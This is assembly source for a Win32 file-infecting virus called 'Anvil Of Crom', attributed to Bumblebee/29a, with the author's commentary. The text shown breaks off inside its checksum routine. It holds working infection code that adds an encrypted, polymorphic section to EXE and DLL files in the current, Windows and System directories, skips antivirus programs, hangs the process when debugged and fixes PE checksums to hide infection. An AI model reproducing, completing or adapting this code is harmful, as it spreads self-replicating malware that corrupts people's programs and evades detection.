   ;
   ;  [AOC] Anvil Of Crom
   ;  coded by Bumblebee/29a
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄ
   ;   Disclaimer
   ;   ÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   . This is the source code of a VIRUS. At the date of today a source
   ;   cannot do any kind of damage to your comp. Use it at your own risk.
   ;   The author is not responsabile of any damage that may occur due to
   ;   the assembly of this file.
   ;
   ;   ÄÄÄÄÄÄÄÄ
   ;   Abstract
   ;   ÄÄÄÄÄÄÄÄ
   ;
   ;   . Win32 (assumed, not tested under W2k) run-time virus. Variable
   ;   multi-layer encryption with polymorphism and key slide. Infects
   ;   EXE/DLL files adding new section. Some anti-debug tricks.
   ;   Uses SEH. Uses CRC32 to find APIs instead of names. Infects the
   ;   directories: current, windows and system. Updates the CheckSum
   ;   of PE after infection using its own routine. Avoids infect most
   ;   used anti-virus.
   ;
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄ
   ;   Introduction
   ;   ÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   . This is my first win32 PE appender. Another time the name is
   ;   due to the music i was listening when i coded the virus. This is
   ;   a song from 'Conan the barbarian' original soundtrack. The main
   ;   theme of this amazing movie. Yeah, i know. I live in the past ;)
   ;
   ;   . As ever i code a new virus i develope a lot of ideas but most
   ;   are not included in the final version of the virus. May be you
   ;   wonder why. Some ideas are not compatible and i must decide what
   ;   to include. This happened some time ago with Deus. This virus
   ;   will not be finished... but some parts of it were include in
   ;   other projects like Luna, Anaphilaxys, ... and this virus. I'm
   ;   not going to explain here what i did for AOC and is not included.
   ;   hehehe. You'll see it in next viruses ;)
   ;
   ;   . I tried to exploit some properties of winblows showing technics
   ;   really easy to code (if you're experienced win32 coder then skip
   ;   next two subpoints):
   ;      - When a DLL is loaded by a process (run-time or at loading
   ;   time by the system) the DLL main is executed to provide to the
   ;   DLL a way to do some inits, as example. When a DLL is loaded the
   ;   system puts it in the same space of addresses of the process that
   ;   loads the library. And, that is the most important, the work
   ;   directory of the DLL is the same of the loader. So if we infect
   ;   a DLL and a process loads it, we must only scan in the work
   ;   directory for files to infect in the DLL and we get a nice way
   ;   to spread. But this is limited. If the DLL is loaded in run-time
   ;   we cannot infect a file being run (the damn OS fucks this kind of
   ;   modification). Don't worry, there are a lot of posibilities: can
   ;   be other EXE or DLL there to infect.
   ;      - In the infection of the PE adding a new section i do another
   ;   little trick. If we look into the section description we see that
   ;   Virtual Size is the size of the section into memory, and Physical
   ;   Size is the size of the section into the file aligned to the...
   ;   blah, blah. The only one restriction you find is that PS must be
   ;   less or equal to VS. So nothing is wrong if we set our section's
   ;   VS to <VirusSize>+<BufferSize>. So the size of the section grows
   ;   in memory, filling the OS with zeroes the difference. This implies
   ;   the code is structured in a special way... but nothing you cannot
   ;   do. And alloc memory during the virus execution is not needed ;)
   ;   You say when you set up the new section attributes what amount of
   ;   memory you want, but into the file the section is as small as
   ;   aligment lets: with 1000h as aligment (as example) the section
   ;   size will be 1000h bytes in file, but more of 1000h into memory.
   ;
   ;   Both tricks, are not tricks. I only coded it following the rules
   ;   of windoze. This is basic and simple stuff, i know.
   ;
   ;   . Trying to do the virus harder to analize i coded LENDE. 'Little
   ;   ENcryptor/DEcryptor' allows to encrypt little piezes of the
   ;   virus using the CRC32 of another part of the virus as key.
   ;
   ;   ÄÄÄÄÄÄÄÄ
   ;   Features
   ;   ÄÄÄÄÄÄÄÄ
   ;
   ;   . Dinamic search for the kernel with SEH:
   ;       - Windows 95/98
   ;       - Windows NT
   ;       - Windows 2000
   ;
   ;   . Scans the K32 for the needed APIs using CRC32 instead of names.
   ;   Takes care of the count of APIs exported from K32. May be in future
   ;   versions of K32 any API i search is removed... or the name changes.
   ;   Bah, only makes the virus more stable.
   ;
   ;   . Infection adding a new section called '.ntext'. Creates this section
   ;   with a Virtual Size of <virus size>+<bufferSize> to have a nice buffer
   ;   when the program is mapped into memory in execution time.
   ;   I don't need to alloc memory in the virus execution 'cause system
   ;   does this for me ;) This virus infects PE: both EXE and DLL. SEH used.
   ;   When the virus jumps back to the host takes care of relocations 'cause
   ;   this jump is the only one fix address of the virus. The rest uses the
   ;   delta offset with ebp.
   ;
   ;   . AOC infects EXE and DLL in current directory, if current directory
   ;   is not equal to windows directory then infects DLL into windows dir.
   ;   Moreover if current directory is not windows\system dir and is not
   ;   windows dir, it infects all DLL found into windows\system. It's very
   ;   infectious, so it can slow down the system. Due to this i used size
   ;   padding as infection sign . So i can know if a file is infected
   ;   using only findf and findn, that is looking only the size of the
   ;   file. First execution of the virus in a clean system will be very
   ;   slow, but not next times.
   ;
   ;   . Contains a little trick that allows the virus to check if it's
   ;   being debugged. If this occurs the virus hangs the process. But
   ;   if the aver is good using the debugger, there is nothing to do. Due
   ;   to this i coded LENDE. If the guy debugging modifies some code to
   ;   avoid a check of the virus, he must restore the change 'cause
   ;   other pieze of code is encrypted and the decryptor uses it as
   ;   key of encryption. This is used to protect different parts of
   ;   the virus i want unmodified. Moreover LENDE works as another layer
   ;   of encryption. One point aganist: the speed. With two layers of
   ;   encryption (one polymorphic) the infection part is slow... adding
   ;   LENDE means more loops.
   ;   The first time the virus runs in a clean system... hehehe. If
   ;   you don't have a Pentium better you go and take two beers from
   ;   the kitchen.
   ;
   ;   . Uses variable encryption with polymorphism and two layers of
   ;   encryption. The second one is not polymorphic and is only 8 bits.
   ;   The polymorphic one is of 64 bits, variable each 64 bits. This is
   ;   for avoid the damn emulators finding a generic decryptor. Darkman
   ;   said me it is: 'Encryption with 64 bits key and slide'. First
   ;   notice! The polymorphism is like all polys i do: a shit :( Nothing
   ;   to do at this point, i feel coding polys is damn borring. But i
   ;   ever do my best! It's a semi-slow polymorphic virus.
   ;
   ;   . Avoids infect most used av programs.
   ;
   ;   . If the internal counter is bigger than 100h the virus opens a
   ;   console and writes there its copyright message. Better than simple
   ;   messagebox ;)
   ;
   ;   Enjoy it!
   ;
   ;                                                     The way of the bee
   ;
   ;
   ;    Thanx this time goes to Virus Buster for his tests under NT. And to
   ;   my gf... hehehe i know how embarrassing i was when i did the dissasm
   ;   of CheckSumMappedFile: this must be love ;)
   ;
   ;
   .486p
   locals
   .model flat,STDCALL

           extrn           ExitProcess:PROC        ; needed for 1st generation

           vSize           equ     vEnd-vBegin     ; real size of the virus
           cSize           equ     offset cryptEnd-offset cryptIni
           pathSize        equ     260             ; max size for the path

           ; some defines for LENDE. Three calls to LENDE used
           LENDE0          equ     offset sname-offset inicio
           LENDE1          equ     offset scanK32-offset inicio
           LENDE2          equ     offset LENDE-offset inicio
           LENDESIZE0      equ     offset scanK32-offset sname
           LENDESIZE1      equ     offset endScanK32-offset scanK32
           LENDESIZE2      equ     offset endLENDE-offset LENDE

           ; fixed addresses of three kernels...
           ; Quiz: why the kernel cannot have relocations?
           K32WIN9X        equ     0bff70000h      ; Windows 95/98
           K32WINNT        equ     077f00000h      ; Windows NT
           K32W2K          equ     077e00000h      ; Windows 2000

           ; i do padding with 7 (this means [0,6] bytes)
           PADDING         equ     7               ; soft infection sign

   ; from BC++ Win32 API on-line Reference
   WIN32_FIND_DATA         struc
   dwFileAttributes        dd      0
   dwLowDateTime0          dd      ?       ; creation
   dwHigDateTime0          dd      ?
   dwLowDateTime1          dd      ?       ; last access
   dwHigDateTime1          dd      ?
   dwLowDateTime2          dd      ?       ; last write
   dwHigDateTime2          dd      ?
   nFileSizeHigh           dd      ?
   nFileSizeLow            dd      ?
   dwReserved              dd      0,0
   cFileName               db      260 dup(0)
   cAlternateFilename      db      14 dup(0)
                           db      2 dup(0)
   WIN32_FIND_DATA         ends

   .DATA
           ; dummy data
           db      'WARNING - This is a virus carrier - WARNING'

   .CODE
   vBegin  label   byte
   inicio:
           call    crypt                           ; decrypt the virus

   cryptIni:
           pushad
                                                   ; decryptor for 2nd layer
           mov     ecx,offset cryptEnd-offset scndLayer

           call    getDelta
   getDelta:                                       ; get the delta offset
           pop     ebp
           sub     ebp,offset getDelta
           lea     esi,inicio+ebp
           add     esi,offset scndLayer-offset inicio
   cryptLoop2nd:
           db      80h,36h                         ; xor byte ptr [esi],???
   scndKey:                                        ; hardcoded
           db      00h
           inc     esi
           loop    cryptLoop2nd

   scndLayer:                                      ; the virus really begins
                                                   ; here...
           xor     eax,eax
           call    CLENDE0                         ; call LENDE for zone 0

   littleCrypt0:                                   ; for LENDE

           db      68h                             ; push hardcoded
   hostEP:                                         ; with hostEP
           dd      offset exit

           db      68h                             ; push hardcoded
   reloc:
           dd      offset inicio                   ; for relocs

           mov     esi,K32W2K                      ; scan for Windows 2000
           call    scanK32
           jnc     K32Found

           mov     esi,K32WINNT                    ; scan for Windows NT
           call    scanK32
           jnc     K32Found

           mov     esi,K32WIN9X                    ; scan for Windows 95/98
           call    scanK32
           jc      goOut

   K32Found:
           mov     dword ptr [kernel32+ebp],esi    ; a K32 found? ;)

   littleCrypt1:                                   ; for LENDE

           xor     eax,eax
           call    CLENDE1                         ; call LENDE for zone 1

   littleCrypt2:                                   ; for LENDE

   ;
   ; Get APIs stuff with CRC32 instead of names...
   ;
           mov     esi,dword ptr [kernel32+ebp]    ; get the needed APIs
           mov     esi,dword ptr [esi+3ch]         ; using the CRC32 method
           add     esi,dword ptr [kernel32+ebp]
           mov     esi,dword ptr [esi+78h]
           add     esi,dword ptr [kernel32+ebp]
           add     esi,1ch

           lodsd
           add     eax,dword ptr [kernel32+ebp]
           mov     dword ptr [address+ebp],eax
           lodsd
           add     eax,dword ptr [kernel32+ebp]
           mov     dword ptr [names+ebp],eax
           lodsd
           add     eax,dword ptr [kernel32+ebp]
           mov     dword ptr [ordinals+ebp],eax

           sub     esi,16
           lodsd
           mov     dword ptr [nexports+ebp],eax

           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx    ; set our counter to 0
           lea     eax,FSTAPI+ebp

   searchl:
           mov     esi,dword ptr [names+ebp]
           add     esi,edx
           mov     esi,dword ptr [esi]
           add     esi,dword ptr [kernel32+ebp]
           push    eax edx
           movzx   di,byte ptr [eax+4]
           call    CRC32
           xchg    ebx,eax
           pop     edx eax
           cmp     ebx,dword ptr [eax]
           je      fFound
           add     edx,4
           inc     dword ptr [expcount+ebp]
           push    edx                             ; test how many exports
           mov     edx,dword ptr [expcount+ebp]    ; scanned yet to
           cmp     dword ptr [nexports+ebp],edx    ; avoid exception if
           pop     edx                             ; the API is not there...
           je      goOut
           jmp     searchl
   fFound:
           shr     edx,1
           add     edx,dword ptr [ordinals+ebp]
           xor     ebx,ebx
           mov     bx,word ptr [edx]
           shl     ebx,2
           add     ebx,dword ptr [address+ebp]
           mov     ecx,dword ptr [ebx]
           add     ecx,dword ptr [kernel32+ebp]

           mov     dword ptr [eax+5],ecx
           add     eax,9
           xor     edx,edx
           mov     dword ptr [expcount+ebp],edx
           lea     ecx,ENDAPI+ebp
           cmp     eax,ecx
           jb      searchl

           xor     eax,eax
           call    CLENDE2                         ; call lende for zone 3

   littleCrypt4:                                   ; for LENDE

           inc     dword ptr [countGen+ebp]

           cmp     dword ptr [countGen+ebp],100h
           jb      skipWriteMessage

           call    dword ptr [_AllocConsole+ebp]   ; get a console if not
                                                   ; alloced yet
           push    -11
           call    dword ptr [_GetStdHandle+ebp]   ; get sdtout
           inc     eax
           jz      skipWriteMessage
           dec     eax

           push    0                               ; write our message
           lea     esi,polyBuffer+ebp
           push    esi
           push    messSize
           lea     esi,sname+ebp
           push    esi
           push    eax
           call    dword ptr [_WriteConsoleA+ebp]

   skipWriteMessage:

           ; make the poly sample used later to infect

           lea     eax,dword ptr [esp-8h]          ; setup SEH
           xor     edi,edi                         ; ah... devil never sleeps
           xchg    eax,dword ptr fs:[edi]
           lea     edi,DamnException+ebp
           push    edi
           push    eax

           call    dword ptr [_GetTickCount+ebp]   ; key for 1st layer
           xor     eax,ebp
           mov     byte ptr [scndKey+ebp],al

           call    dword ptr [_GetTickCount+ebp]   ; 64 bits key: ebx eax
           mov     ebx,eax
           xor     eax,29a0babeh

           push    eax ebx
           lea     edi,tmpVirus+ebp
           add     edi,vSize
           mov     ecx,cSize
           call    AOCPE                           ; generate poly decriptor
           pop     ebx ecx

           mov     dword ptr [HiKey+ebp],ecx
           mov     dword ptr [LoKey+ebp],ebx

           add     eax,vSize
           mov     dword ptr [gensize+ebp],eax     ; save the size

           xor     esi,esi                         ; quit SEH
           pop     dword ptr fs:[esi]
           pop     eax

           xor     eax,eax
           inc     eax
           call    infectDir                       ; search for exe in currdir

           xor     eax,eax
           call    infectDir                       ; search for dll in currdir

           lea     esi,currentPath+ebp             ; get current directory
           push    esi
           push    pathSize
           call    dword ptr [_GetCurrentDirectoryA+ebp]
           or      eax,eax
           jz      goOut

           push    pathSize                        ; get windows directory
           lea     esi,tempPath+ebp
           push    esi
           call    dword ptr [_GetWindowsDirectoryA+ebp]
           or      eax,eax
           jz      goSystemDir

           mov     ecx,eax                         ; test if we are in win
           lea     edi,currentPath+ebp             ; directory to avoid
           rep     cmpsb                           ; scan the same dir twice
           je      goOut                           ; (not scan windows\system)

           lea     esi,tempPath+ebp                ; change to windows dir
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

           xor     eax,eax
           call    infectDir                       ; search for dll

   goSystemDir:
           push    pathSize                        ; get system directory
           lea     esi,tempPath+ebp
           push    esi
           call    dword ptr [_GetSystemDirectoryA+ebp]
           or      eax,eax
           jz      goHomeYankie

           mov     ecx,eax                         ; test if we are in sys
           lea     edi,currentPath+ebp             ; directory to avoid
           rep     cmpsb                           ; scan the same dir twice
           je      goHomeYankie

           lea     esi,tempPath+ebp                ; change to system dir
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

           xor     eax,eax
           call    infectDir                       ; search for dll

   goHomeYankie:
           lea     esi,currentPath+ebp             ; return to our directory ;)
           push    esi
           call    dword ptr [_SetCurrentDirectoryA+ebp]

   littleCrypt5:                                   ; for LENDE
   littleCrypt3:                                   ; for LENDE
   goOut:
           lea     edi,inicio+ebp                  ; setup the jump
           pop     esi                             ; back to host
           sub     edi,esi                         ; i take care of
           pop     esi                             ; the relocations
           add     esi,edi
           mov     dword ptr [jmpBack+ebp],esi
   ;
   ; How to do a relocation? I save the address that must have my 'inicio'
   ; address at infection time. Later, at execution time, i get the actual
   ; address of 'inicio' and sub the fixed address. The result is the
   ; value i must add to the host old EP to get the new address. I know
   ; this can be done in other way, like adding a new bank in the reloc
   ; section of the PE... If you don't take care of this you cannot rely
   ; in a 'push <addres> ret'. May be is only theory with EXEs, but a file
   ; not-fixed and/or with relocations can be loaded in different plazes
   ; than its Image Base. Using this push/ret jump the return address is not
   ; calculated 'till execution time... hard for an emulator? In the file
   ; you'll see forever and ever: push 00000000h/ret. Relocation is NEEDED
   ; with DLL with the push/ret jump. If file not relocated the Image Base
   ; is the same than Image Base got in execution time, so the sub is zero
   ; and adding zero to the Host EP we have no change.
   ;
   ; Moreover we need to patch the virus 'inicio' 'cause DLL code runs another
   ; time when is unloaded and we want to run virus once due to the way of
   ; infection... with another method we could infect at unload too, or only
   ; at unload. May be next time ;)
   ;
           lea     esi,patchVirus+ebp              ; patch our virus:
           lea     edi,inicio+ebp                  ; just copy our jump to
           mov     ecx,patchSize                   ; host at the begining
           rep     movsb
           popad                                   ; restore regs

   patchVirus:
           db      68h                             ; push hardcoded
   jmpBack:
           dd      0
           ret                                     ; jump back to host
   patchSize       equ     offset $-offset patchVirus

   DamnException:                                  ; fuck! next time...
           xor     esi,esi
           mov     eax,dword ptr fs:[esi]
           mov     esp,dword ptr [eax]
           call    deltaExcept0
   deltaExcept0:                                   ; get delta another time
           pop     ebp
           sub     ebp,offset deltaExcept0
           jmp     goOut


   ; This is the data that must travel with the virus... the rest is
   ; only temporary buffer...
   ; some strings to test if the virus is about to infect an av prog
   avStrings       dw      'VA','NA','RD','RE','DO','BT','-F'
   vStringsCout    equ     (offset $-offset avStrings)/2
   ; needed for file search ---------------------------------------------------
   exeMask                 db      '*.exe',0       ; mask to find exe files
   dllMask                 db      '*.dll',0       ; mask to find dll files
   maskSize                equ     offset $-offset dllMask
   ; --------------------------------------------------------------------------

   ; copyright ----------------------------------------------------------------
   sname   db      '< [AOC] - Anvil of Crom virus Coded by Bumblebee/29a >'
   messSize equ    offset $-offset sname
   ; --------------------------------------------------------------------------

   ; CRC32 and plaze to store APIs used ---------------------------------------
   FSTAPI                  label   byte
   CrcCreateFileA          dd      08c892ddfh
   size0                   db      12
   _CreateFileA            dd      0

   CrcMapViewOfFile        dd      0797b49ech
   size1                   db      14
   _MapViewOfFile          dd      0

   CrcCreatFileMappingA    dd      096b2d96ch
   size2                   db      19
   _CreateFileMappingA     dd      0

   CrcUnmapViewOfFile      dd      094524b42h
   size3                   db      16
   _UnmapViewOfFile        dd      0

   CrcCloseHandle          dd      068624a9dh
   size4                   db      12
   _CloseHandle            dd      0

   CrcGetFileTime          dd      04434e8feh
   size5                   db      12
   _GetFileTime            dd      0

   CrcSetFileTime          dd      04b2a3e7dh
   size6                   db      12
   _SetFileTime            dd      0

   CrcSetFileAttributesA   dd      03c19e536h
   size7                   db      19
   _SetFileAttributesA     dd      0

   CrcGetFileAttributesA   dd      0c633d3deh
   size8                   db      19
   _GetFileAttributesA     dd      0

   CrcFindFirstFileA       dd      0ae17ebefh
   size9                   db      15
   _FindFirstFileA         dd      0

   CrcFindNextFileA        dd      0aa700106h
   size10                  db      14
   _FindNextFileA          dd      0

   CrcFindClose            dd      0c200be21h
   size11                  db      10
   _FindClose              dd      0

   CrcGetCurrentDirectoryA dd      0ebc6c18bh
   size12                  db      21
   _GetCurrentDirectoryA   dd      0

   CrcSetCurrentDirectoryA dd      0b2dbd7dch
   size13                  db      21
   _SetCurrentDirectoryA   dd      0

   CrcGetWindowsDirectoryA dd      0fe248274h
   size14                  db      21
   _GetWindowsDirectoryA   dd      0

   CrcGetSystemDirectoryA  dd      0593ae7ceh
   size15                  db      20
   _GetSystemDirectoryA    dd      0

   CrcGetTickCount         dd      0613fd7bah
   size16                  db      13
   _GetTickCount           dd      0

   CrcAllocConsole         dd      031998e82h
   size17                  db      13
   _AllocConsole           dd      0

   CrcGetStdHandle         dd      0e50009f4h
   size18                  db      13
   _GetStdHandle           dd      0

   CrcWriteConsoleA        dd      0f01c7323h
   size19                  db      14
   _WriteConsoleA          dd      0

   ENDAPI                  label   byte
   ; --------------------------------------------------------------------------

   ;
   ; scan kernel stuff with SEH (input esi: K32 addr to scan)
   ;
   ; Darkman, you're right. Why not? now i can include W2K stuff ;)
   ;
   scanK32:
           pushad                                  ; save all
           lea     eax,dword ptr [esp-8h]          ; setup SEH
           xor     edi,edi
           xchg    eax,dword ptr fs:[edi]
           lea     edi,scanException+ebp           ; addr to jump if Execption
           push    edi
           push    eax

           xor     edi,edi
           call    imBeingDebugged                 ; SEH does anti-debug trick
                                                   ; debugger step by step: KO
   imBeingDebugged:
           cmp     edi,dword ptr fs:[edi+20h]      ; we are being debugged?
           je      notDebuged
   fool:
           cli
           wbinvd
           call    fool                            ; pseh... can be better

   notDebuged:
           add     esp,4

           cmp     word ptr [esi],'ZM'             ; is an exe?
           jne     scanNotFound

           xor     esi,esi                         ; quit SEH
           pop     dword ptr fs:[esi]
           pop     eax
           popad                                   ; restore all
           clc                                     ; may be K32 ;)
           ret

   scanException:                                  ; oh
           xor     esi,esi
           mov     eax,dword ptr fs:[esi]
           mov     esp,dword ptr [eax]
           call    deltaExcept
   deltaExcept:                                    ; get delta another time
           pop     ebp
           sub     ebp,offset deltaExcept
   scanNotFound:
           xor     esi,esi                         ; quit SEH
           pop     dword ptr fs:[esi]
           pop     eax
           popad                                   ; restore all
           stc                                     ; sure is not K32 :(
           ret
   endScanK32:

   ;
   ; CRC32
   ;
   ;  IN:  esi     offset of data to do CRC32
   ;       edi     size to do CRC32
   ;
   ;  OUT:
   ;       eax     CRC32
   ;
   ; Original routine by Vecna. Gracias!
   ;
   CRC32:
       cld
           xor     ecx,ecx
           dec     ecx
       mov     edx,ecx
       push    ebx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:
           dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
           dec     edi
       jnz     NextByteCRC
       pop     ebx
       not     edx
       not     ecx
       mov     eax,edx
       rol     eax,16
       mov     ax,cx
       ret

   countGen        dd      0                       ; for payload activation
   ;
   ; infection process adding new section (esi zstring of file to infect)
   ;
   ; some stuff (section):
   ;
   ;   Plaze      Length       Desc
   ;    00h        08h          Name of the baby
   ;    08h        04h          virtual size (size to allocate)
   ;    0ch        04h          RVA (relative virtual adress)
   ;    10h        04h          phys size (less or equal to virtSize)
   ;    14h        04h          phys offset (offset from bof of the section)
   ;    1ch        0ch          shit, shit, shit
   ;    24h        04h          Properties of the baby (we want CERW)
   ;

   ; this is our section
   sect            db      '.ntext',0,0
   sVirtSize       dd      (((vSize+sizeOfBuffer)/1000h)+1)*1000h ; align to 4kb
   sRVA            dd      0
   sPhysSize       dd      0
   sPhysOffs       dd      0
   sShit           db      0ch dup (0)
   sProper         dd      0e0000020h

   infection:
           mov     dword ptr [fNameAddr+ebp],esi   ; for laaater use

           pushad                                  ; save all
           lea     eax,dword ptr [esp-8h]          ; setup SEH
           xor     edi,edi
           xchg    eax,dword ptr fs:[edi]
           lea     edi,infException+ebp
           push    edi
           push    eax

           push    esi
           push    esi
           call    dword ptr [_GetFileAttributesA+ebp]
           pop     esi
           inc     eax
           jz      infectionError                  ; get file attributes
           dec     eax

           mov     dword ptr [fileAttrib+ebp],eax  ; save to restore later

           push    esi
           push    00000080h
           push    esi
           call    dword ptr [_SetFileAttributesA+ebp]
           pop     esi
           or      eax,eax
           jz      infectionError                  ; clear attributes

           xor     eax,eax
           push    eax
           push    00000080h
           push    00000003h
           push    eax
           push    eax
           push    80000000h OR 40000000h
           push    esi
           call    dword ptr [_CreateFileA+ebp]    ; open the file not shared
           inc     eax                             ; read write
           jz      infectionErrorAttrib
           dec     eax

           mov     dword ptr [fHnd+ebp],eax        ; save file handle

           lea     edi,fileTime2+ebp
           push    edi
           lea     edi,fileTime1+ebp
           push    edi
           lea     edi,fileTime0+ebp
           push    edi
           push    eax
           call    dword ptr [_GetFileTime+ebp]
           or      eax,eax
           jz      infectionErrorClose             ; get file time

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax                         ; create a mapping file
           jz      infectionErrorClose             ; for read/write

           mov     dword ptr [fhmap+ebp],eax       ; save

           xor     eax,eax
           push    eax
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; create map view (r/w)
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax      ; save

           mov     edi,eax
           cmp     word ptr [edi],'ZM'             ; test if EXE
           jne     infectionErrorCloseUnmap

           add     edi,dword ptr [edi+3ch]         ; test if PE
           cmp     word ptr [edi],'EP'
           jne     infectionErrorCloseUnmap

           mov     edx,edi                         ; save for later use

           cmp     dword ptr [edx+28h],0           ; this is not dumb
           je      infectionErrorCloseUnmap        ; check for DLL

           mov     esi,edi                         ; skip image header and
           mov     eax,18h                         ; optional header
           add     ax,word ptr [edi+14h]
           add     edi,eax

           push    edx
           mov     cx,word ptr [esi+06h]           ; search end of last
           mov     ax,28h                          ; section desc -1
           dec     cx
           mul     cx
           add     edi,eax
           pop     edx

           mov     eax,dword ptr [edx+60h]         ; setup the stack for our
           cmp     eax,40000h                      ; poly engine
           ja      reservedStackOK                 ; we do a lot of pushs and
           mov     eax,40000h                      ; i've noticed stack errors
           mov     dword ptr [edx+60h],eax         ; so this will avoid them
   reservedStackOK:

           mov     eax,dword ptr [edx+64h]
           cmp     eax,40000h
           ja      commitedStakOK
           mov     eax,40000h
           mov     dword ptr [edx+64h],eax
   commitedStakOK:

           mov     eax,dword ptr [edi+10h]
           add     eax,dword ptr [edi+14h]
           mov     dword ptr [fileSize+ebp],eax    ; we do fix
           mov     dword ptr [sPhysOffs+ebp],eax   ; the end of section is the
                                                   ; the begining of the new
                                                   ; section we add (physically)

           mov     eax,dword ptr [edi+0ch]         ; calc our RVA looking
           add     eax,dword ptr [edi+08h]         ; in the actual
                                                   ; last section
           push    edx                             ; calc the new obj align:
           mov     ecx,dword ptr [edx+38h]         ; get obj aligment
           xor     edx,edx
           div     ecx                             ; div RVA/aligment
           inc     eax                             ; plus one
           xor     edx,edx
           mul     ecx                             ; mul by aligment
           pop     edx

           mov     dword ptr [sRVA+ebp],eax

   ; Notice i don't test if the last section description is the last section
   ; in the array of sections, like Qozah explains (hey! how are you man?).
   ; So this can fake the file... but as far as i know the linker ever puts
   ; the sections desc in order, else...

           add     edi,28h                         ; goto end of last section
           push    edi esi
           mov     ecx,28h                         ; test if there is space
           xor     eax,eax                         ; for a new section
           rep     scasb
           pop     esi edi
           jnz     infectionErrorCloseUnmap

           inc     word ptr [esi+06h]              ; add a new section ;)

           push    edi                             ; store new ep and get old
           mov     edi,dword ptr [sRVA+ebp]        ; set edi=new ep
           push    edi
           add     edi,dword ptr [esi+34h]         ; setup our reloc ;)
           mov     dword ptr [reloc+ebp],edi       ; needed for return back
           pop     edi                             ; to host if relocation

           xchg    edi,dword ptr [esi+28h]         ; get host IP and set
           add     edi,dword ptr [esi+34h]         ; new
           mov     dword ptr [hostEP+ebp],edi      ; save it
           pop     edi

           push    edx                             ; calc the new section size:
           mov     eax,dword ptr [gensize+ebp]     ; get virus generated size
           mov     ecx,dword ptr [edx+3ch]         ; get aligment
           xor     edx,edx
           div     ecx                             ; div vSize/aligment
           inc     eax                             ; plus one
           xor     edx,edx
           mul     ecx                             ; mul by aligment
           pop     edx

           mov     dword ptr [sPhysSize+ebp],eax   ; store the phys size

           push    edx
           mov     ecx,PADDING                     ; calc our padding
           add     eax,dword ptr [fileSize+ebp]
           xor     edx,edx
           div     ecx
           inc     eax
           xor     edx,edx
           mul     ecx
           mov     dword ptr [pad+ebp],eax
           pop     edx
                                                   ; calc fix for the img size
           mov     eax,dword ptr [sVirtSize+ebp]   ; get our virt size
           mov     ecx,dword ptr [edx+38h]         ; get obj aligment
           push    edx
           xor     edx,edx
           div     ecx                             ; div virt size/aligment
           inc     eax                             ; plus one
           xor     edx,edx
           mul     ecx                             ; mul by aligment
           pop     edx

           add     dword ptr [edx+50h],eax         ; fix the image size

           mov     ecx,28h                         ; copy our new section
           lea     esi,sect+ebp
           rep     movsb

           mov     byte ptr [lendeFlag+ebp],0ffh   ; activate LENDE

           mov     ecx,vSize                       ; make a clean copy
           lea     edi,tmpVirus+ebp                ; of the virus
           lea     esi,vBegin+ebp
           rep     movsb

           xor     eax,eax
           inc     eax
           call    CLENDE2                         ; encrypt 3rd zone
           call    CLENDE0                         ; encrypt 1st zone
           call    CLENDE1                         ; encrypt 2nd zone

                                                   ; encrypt 2nd layer 1st
           mov     ecx,offset cryptEnd-offset scndLayer
           lea     esi,tmpVirus+ebp
           add     esi,offset scndLayer-offset inicio
           mov     al,byte ptr [scndKey+ebp]
   cryptLoop0:
           xor     byte ptr [esi],al
           inc     esi
           loop    cryptLoop0

           mov     ebx,dword ptr [LoKey+ebp]
           mov     eax,dword ptr [HiKey+ebp]

           lea     esi,tmpVirus+ebp                ; encrypt 1st layer
           add     esi,offset cryptIni-offset inicio
           mov     ecx,cSize/8
   cryptLoop:
           xor     dword ptr [esi],ebx
           add     esi,4
           add     ebx,01020304h
           xor     dword ptr [esi],eax
           add     esi,4
           sub     eax,01020304h
           loop    cryptLoop

           push    dword ptr [mapMem+ebp]
           call    dword ptr [_UnmapViewOfFile+ebp] ; delete map view

           push    dword ptr [fhmap+ebp]           ; close the mapped file
           call    dword ptr [_CloseHandle+ebp]

           xor     eax,eax
           push    eax
           push    dword ptr [pad+ebp]
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [fHnd+ebp]
           call    dword ptr [_CreateFileMappingA+ebp]
           or      eax,eax                         ; create a mapping file
           jz      infectionErrorClose             ; for read/write adding our
                                                   ; virus+padding
           mov     dword ptr [fhmap+ebp],eax       ; save

           xor     eax,eax
           push    dword ptr [pad+ebp]
           push    eax
           push    eax
           push    00000004h OR 00000002h
           push    dword ptr [fhmap+ebp]
           call    dword ptr [_MapViewOfFile+ebp]  ; and remap
           or      eax,eax
           jz      infectionErrorCloseMap

           mov     dword ptr [mapMem+ebp],eax      ; save

           mov     ecx,dword ptr [gensize+ebp]
           lea     esi,tmpVirus+ebp
           mov     edi,eax
           add     edi,dword ptr [fileSize+ebp]
           rep     movsb                           ; copy our babe to file

           xchg    ecx,eax                         ; bah... is not needed
           mov     eax,edi                         ; but i want ALL the padding
           sub     eax,ecx                         ; to be zero
           mov     ecx,dword ptr [pad+ebp]
           sub     ecx,eax
           xor     eax,eax
           rep     stosb

           mov     ecx,dword ptr [pad+ebp]         ; calc the new check sum
           inc     ecx
           shr     ecx,1
           mov     esi,dword ptr [mapMem+ebp]
           call    CheckSumMappedFile              ; calc partial check sum
           add     esi,dword ptr [esi+3ch]         ; goto begin of nt header
           mov     word ptr [pchcks+ebp],ax
           mov     edx,1                           ; complete the check sum
           mov     ecx,edx
           mov     ax,word ptr [esi+58h]
           cmp     word ptr [pchcks+ebp],ax
           adc     ecx,-1
           sub     word ptr [pchcks+ebp],cx
           sub     word ptr [pchcks+ebp],ax
